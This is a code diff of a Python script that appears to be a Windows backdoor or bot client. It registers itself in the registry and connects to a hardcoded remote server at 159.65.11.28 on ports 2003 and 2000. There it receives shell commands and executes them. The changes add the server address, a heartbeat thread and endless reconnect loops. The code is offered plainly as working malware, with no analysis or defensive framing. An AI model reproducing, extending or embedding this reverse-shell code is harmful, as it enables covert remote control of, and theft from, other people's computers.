@@ -12,6 +12,10 @@ from urllib import request
 import winreg
 import base64 as b64
 
+ip = "159.65.11.28"
+#ip = "127.0.0.1"
+active = False
+
 #Useless func
 def create_botserver():
     ip = load(request.urlopen("https://api.ipify.org/?format=json"))['ip']
@@ -44,6 +48,18 @@ def process_shell(cmd,s):
     except:
         s.send("FAILED".encode())
 
+def check_session():
+    global ip,active
+    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    ss.connect((ip,2000))
+    print("Connected 2")
+    while True:
+        try:
+            ss.send("1".encode())
+        except socket.error:
+            active = False
+            return
+
 
 def start_regitry_edit():
     try:
@@ -66,6 +82,9 @@ def start_regitry_edit():
 
 def start_session(s):
     while True:
+        global active
+        if(active != True):
+            return
         try:
             cmd = s.recv(1024).decode()
 
@@ -167,16 +186,22 @@ def start_session(s):
             print("Error : %s"%(str(e)))
 
 def main():
+    global ip,active
     while True:
         try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect(("159.65.11.28",2003))
-            #print("Connected")
+            s.connect((ip,2003))
+            print("Connected")
+            active = True
+            stop_threads = False
             conn_process = Thread(target=start_session,args=(s,))
+            conn_checker = Thread(target=check_session,args=())
+            conn_checker.start()
             conn_process.start()
             conn_process.join()
         except socket.error:
-            #print("Attempting to reconnect...")
+            stop_threads = True
+            print("Attempting to reconnect...")
             main()
         except:
             print("Unknown error occured")
@@ -184,7 +209,9 @@ def main():
 if __name__ == '__main__':
     #path = os.getcwd()
     #subprocess.Popen("%s/bot.exe"%(path),creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)
-
-    main_thread = Thread(target=main,args=())
-    #main_thread.setmDaemon(True)
-    main_thread.start()
+    while True:
+        main_thread = Thread(target=main,args=())
+        #main_thread.setmDaemon(True)
+        main_thread.start()
+        main_thread.join()
+        print("[*]Retrying...")
